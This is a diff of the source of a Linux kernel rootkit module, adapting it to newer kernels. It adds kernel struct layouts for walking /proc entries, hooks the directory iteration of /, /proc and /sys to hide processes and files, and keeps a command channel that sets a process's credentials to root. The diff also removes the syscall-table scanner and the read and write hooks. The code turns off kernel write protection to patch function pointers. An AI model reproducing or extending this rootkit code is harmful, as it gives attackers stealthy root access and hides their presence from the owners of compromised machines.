@@ -38,8 +38,36 @@
 #include <linux/delay.h>
 #include <linux/version.h>
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 0, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0)
+
+struct proc_dir_entry {
+	unsigned int low_ino;
+	umode_t mode;
+	nlink_t nlink;
+	kuid_t uid;
+	kgid_t gid;
+	loff_t size;
+	const struct inode_operations *proc_iops;
+	const struct file_operations *proc_fops;
+	struct proc_dir_entry *next, *parent, *subdir;
+	void *data;
+	atomic_t count;		/* use count */
+	atomic_t in_use;	/* number of callers into module in progress; */
+			/* negative -> it's going away RSN */
+	struct completion *pde_unload_completion;
+	struct list_head pde_openers;	/* who did ->open, but not ->release */
+	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+	u8 namelen;
+	char name[];
+};
+
+/*
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+*/
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 
 // Copy-pasted from Linux sources as it's not provided in public headers
 // of newer Linux.
@@ -69,6 +97,57 @@ struct proc_dir_entry {
     char name[];
 };
 
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
+
+struct proc_dir_entry {
+    unsigned int low_ino;
+    umode_t mode;
+    nlink_t nlink;
+    kuid_t uid;
+    kgid_t gid;
+    loff_t size;
+    const struct inode_operations *proc_iops;
+    const struct file_operations *proc_fops;
+    struct proc_dir_entry *parent;
+    struct rb_root subdir;
+    struct rb_node subdir_node;
+    void *data;
+    atomic_t count;     /* use count */
+    atomic_t in_use;    /* number of callers into module in progress; */
+            /* negative -> it's going away RSN */
+    struct completion *pde_unload_completion;
+    struct list_head pde_openers;   /* who did ->open, but not ->release */
+    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+    u8 namelen;
+    char name[];
+} __randomize_layout;
+
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
+
+struct proc_dir_entry {
+    unsigned int low_ino;
+    umode_t mode;
+    nlink_t nlink;
+    kuid_t uid;
+    kgid_t gid;
+    loff_t size;
+    const struct inode_operations *proc_iops;
+    const struct file_operations *proc_fops;
+    struct proc_dir_entry *parent;
+    struct rb_root_cached subdir;
+    struct rb_node subdir_node;
+    void *data;
+    atomic_t count;     /* use count */
+    atomic_t in_use;    /* number of callers into module in progress; */
+            /* negative -> it's going away RSN */
+    struct completion *pde_unload_completion;
+    struct list_head pde_openers;   /* who did ->open, but not ->release */
+    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+    u8 namelen;
+    char name[];
+} __randomize_layout;
+
 #endif
 
 #include "config.h"
@@ -92,188 +171,6 @@ MODULE_AUTHOR("Maxim Biro <nurupo.contributions@gmail.com>");
         preempt_enable(); \
         write_cr0(read_cr0() | 0x10000); \
     } while (0);
-
-
-// ========== SYS_CALL_TABLE ==========
-
-
-#if defined __i386__
-    #define START_ADDRESS 0xc0000000
-    #define END_ADDRESS 0xd0000000
-#elif defined __x86_64__
-    #define START_ADDRESS 0xffffffff81000000
-    #define END_ADDRESS 0xffffffffa2000000
-#else
-    #error ARCH_ERROR_MESSAGE
-#endif
-
-void **sys_call_table;
-
-/**
- * Finds a system call table based on a heruistic.
- * Note that the heruistic is not ideal, so it might find a memory region that
- * looks like a system call table but is not actually a system call table, but
- * it seems to work all the time on my systems.
- *
- * @return system call table on success, NULL on failure.
- */
-void **find_syscall_table(void)
-{
-    void **sctable;
-    void *i = (void*) START_ADDRESS;
-
-    while (i < END_ADDRESS) {
-        sctable = (void **) i;
-
-        // sadly only sys_close seems to be exported -- we can't check against more system calls
-        if (sctable[__NR_close] == (void *) sys_close) {
-            size_t j;
-            // we expect there to be at least 300 system calls
-            const unsigned int SYS_CALL_NUM = 300;
-            // sanity check: no function pointer in the system call table should be NULL
-            for (j = 0; j < SYS_CALL_NUM; j ++) {
-                if (sctable[j] == NULL) {
-                    // this is not a system call table
-                    goto skip;
-                }
-            }
-            return sctable;
-        }
-skip:
-        ;
-        i += sizeof(void *);
-    }
-
-    return NULL;
-}
-
-
-// ========== END SYS_CALL_TABLE ==========
-
-
-// ========== HOOK LIST ==========
-
-
-struct hook {
-    void *original_function;
-    void *modified_function;
-    void **modified_at_address;
-    struct list_head list;
-};
-
-LIST_HEAD(hook_list);
-
-/**
- * Replaces a function pointer at some address with a new function pointer,
- * keeping record of the original function pointer so that it could be
- * restored later.
- *
- * @param modified_at_address Pointer to the address of where the function
- * pointer that we want to replace is stored. The same address would be used
- * when restoring the original funcion pointer back, so make sure it doesn't
- * become invalid by the time you try to restore it back.
- *
- * @param modified_function Function pointer that we want to replace the
- * original function pointer with.
- *
- * @return true on success, false on failure.
- */
-int hook_create(void **modified_at_address, void *modified_function)
-{
-    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
-
-    if (!h) {
-        return 0;
-    }
-
-    h->modified_at_address = modified_at_address;
-    h->modified_function = modified_function;
-    list_add(&h->list, &hook_list);
-
-    DISABLE_W_PROTECTED_MEMORY
-    h->original_function = xchg(modified_at_address, modified_function);
-    ENABLE_W_PROTECTED_MEMORY
-
-    return 1;
-}
-
-/**
- * Get original function pointer based on the one we overwrote it with.
- * Useful when wanting to call the original function inside a hook.
- *
- * @param modified_function The function that overwrote the original one.
- * @return original function pointer on success, NULL on failure.
- */
-void *hook_get_original(void *modified_function)
-{
-    void *original_function = NULL;
-    struct hook *h;
-
-    list_for_each_entry(h, &hook_list, list) {
-        if (h->modified_function == modified_function) {
-            original_function = h->original_function;
-            break;
-        }
-    }
-    return original_function;
-}
-
-/**
- * Removes all hook records, restores the overwritten function pointer to its
- * original value.
- */
-void hook_remove_all(void)
-{
-    struct hook *h, *tmp;
-
-    // make it so that instead of `modified_function` the `original_function`
-    // would get called again
-    list_for_each_entry(h, &hook_list, list) {
-        DISABLE_W_PROTECTED_MEMORY
-        *h->modified_at_address = h->original_function;
-        ENABLE_W_PROTECTED_MEMORY
-    }
-    // a hack to let the changes made by the loop above propagate
-    // as some process might be in the middle of our `modified_function`
-    // and call `hook_get_original()`, which would return NULL if we
-    // `list_del()` everything
-    // so we make it so that instead of `modified_function` the
-    // `original_function` would get called again, then sleep to wait until
-    // existing `modified_function` calls finish and only them remove elements
-    // fro mthe list
-    msleep(10);
-    list_for_each_entry_safe(h, tmp, &hook_list, list) {
-        list_del(&h->list);
-        kfree(h);
-    }
-}
-
-
-// ========== END HOOK LIST ==========
-
-
-unsigned long read_count = 0;
-
-asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
-{
-    read_count ++;
-
-    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
-    original_read = hook_get_original(read);
-    return original_read(fd, buf, count);
-}
-
-
-unsigned long write_count = 0;
-
-asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
-{
-    write_count ++;
-
-    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
-    original_write = hook_get_original(write);
-    return original_write(fd, buf, count);
-}
 
 
 // ========== ASM HOOK LIST ==========
@@ -637,10 +534,12 @@ struct file_operations *get_fop(const char *path)
 
 // Macros to help reduce repeated code where only names differ.
 // Decreses risk of "copy-paste & forgot to rename" error.
+
+//static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
 #define FILLDIR_START(NAME) \
     filldir_t original_##NAME##_filldir; \
     \
-    static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
+    static int NAME##_filldir(struct dir_context *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
     {
 
 #define FILLDIR_END(NAME) \
@@ -648,8 +547,22 @@ struct file_operations *get_fop(const char *path)
     }
 
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+#if LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+
+    #define READDIR(NAME) \
+        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
+        { \
+            original_##NAME##_filldir = filldir; \
+            \
+            int (*original_readdir)(struct file *, void *, filldir_t); \
+            original_readdir = asm_hook_unpatch(NAME##_readdir); \
+            int ret = original_readdir(file, dirent, NAME##_filldir); \
+            asm_hook_patch(NAME##_readdir); \
+            \
+            return ret; \
+        }
+
+#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 32)
 
     #define READDIR(NAME) \
         int NAME##_iterate(struct file *file, struct dir_context *context) \
@@ -665,20 +578,7 @@ struct file_operations *get_fop(const char *path)
             return ret; \
         }
 
-#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
 
-    #define READDIR(NAME) \
-        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
-        { \
-            original_##NAME##_filldir = filldir; \
-            \
-            int (*original_readdir)(struct file *, void *, filldir_t); \
-            original_readdir = asm_hook_unpatch(NAME##_readdir); \
-            int ret = original_readdir(file, dirent, NAME##_filldir); \
-            asm_hook_patch(NAME##_readdir); \
-            \
-            return ret; \
-        }
 #else
 
 //#error "Wrong Linux kernel version"
@@ -745,16 +645,22 @@ int execute_command(const char __user *str, size_t length)
         pr_info("Got root command\n");
         struct cred *creds = prepare_creds();
 
+/*
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+*/
+#if LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+        
+        creds->uid = creds->euid = 0;
+        creds->gid = creds->egid = 0;
+        
+//#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0)
+#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 32)
 
         creds->uid.val = creds->euid.val = 0;
         creds->gid.val = creds->egid.val = 0;
 
-#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
 
-        creds->uid = creds->euid = 0;
-        creds->gid = creds->egid = 0;
 
 #endif
 
@@ -827,7 +733,8 @@ static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t c
 
 int setup_proc_comm_channel(void)
 {
-    static const struct file_operations proc_file_fops = {0};
+    //static const struct file_operations proc_file_fops = {0};
+    static const struct file_operations proc_file_fops;
     struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
     proc_entry = proc_entry->parent;
 
@@ -841,8 +748,30 @@ int setup_proc_comm_channel(void)
 
     struct file_operations *proc_fops = NULL;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0)
+
+    proc_entry = proc_entry->subdir;
+
+    while (proc_entry) {
+        pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);
+
+        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
+            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            proc_fops = (struct file_operations *) proc_entry->proc_fops;
+            goto found;
+        }
+
+        proc_entry = proc_entry->next;
+    }
+
+/*
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+*/
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
+	
 
     struct rb_node *entry = rb_first(&proc_entry->subdir);
 
@@ -858,21 +787,40 @@ int setup_proc_comm_channel(void)
         entry = rb_next(entry);
     }
 
-#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
 
-    proc_entry = proc_entry->subdir;
+    struct rb_node *entry = rb_first(&proc_entry->subdir);
 
-    while (proc_entry) {
-        pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);
+    while (entry) {
+        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
 
-        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
+        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
             pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
-            proc_fops = (struct file_operations *) proc_entry->proc_fops;
+            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
             goto found;
         }
 
-        proc_entry = proc_entry->next;
+        entry = rb_next(entry);
     }
+
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
+
+    struct rb_node *entry = rb_first(&proc_entry->subdir.rb_root);
+
+    while (entry) {
+        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
+
+        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
+            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+            goto found;
+        }
+
+        entry = rb_next(entry);
+    }
+
+
 
 #endif
 
@@ -899,26 +847,6 @@ found:
     return 1;
 }
 
-
-static ssize_t devnull_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
-{
-    if (execute_command(buf_user, count)) {
-        return count;
-    }
-
-    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
-    original_write = hook_get_original(devnull_fops_write);
-    return original_write(file, buf_user, count, p);
-}
-
-int setup_devnull_comm_channel(void)
-{
-    hook_create(&get_fop("/dev/null")->write, devnull_fops_write);
-
-    return 1;
-}
-
-
 // ========== END COMM CHANNEL ==========
 
 
@@ -937,39 +865,36 @@ int init(void)
 
     pr_info("Comm channel is set up\n");
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
-    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
-
-    asm_hook_create(get_fop("/")->iterate, root_iterate);
-    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
-    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
-
-#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+#if LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
 
     asm_hook_create(get_fop("/")->readdir, root_readdir);
     asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
     asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
 
+/*
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+*/
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 0, 0) && \
+      LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0) 
+
+    asm_hook_create(get_fop("/")->iterate, root_iterate);
+    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
+    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
+
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 5, 0)
+
+    asm_hook_create(get_fop("/")->iterate_shared, root_iterate);
+    asm_hook_create(get_fop("/proc")->iterate_shared, proc_iterate);
+    asm_hook_create(get_fop("/sys")->iterate_shared, sys_iterate);
+
 #endif
-
-    sys_call_table = find_syscall_table();
-    pr_info("Found sys_call_table at %p\n", sys_call_table);
-
-    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
-
-    hook_create(&sys_call_table[__NR_read], read);
-    hook_create(&sys_call_table[__NR_write], write);
 
     return 0;
 }
 
 void exit(void)
 {
-    pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
-    pr_info("sys_read was called %lu times\n", read_count);
-    pr_info("sys_write was called %lu times\n", write_count);
-
-    hook_remove_all();
     asm_hook_remove_all();
     pid_remove_all();
     file_remove_all();
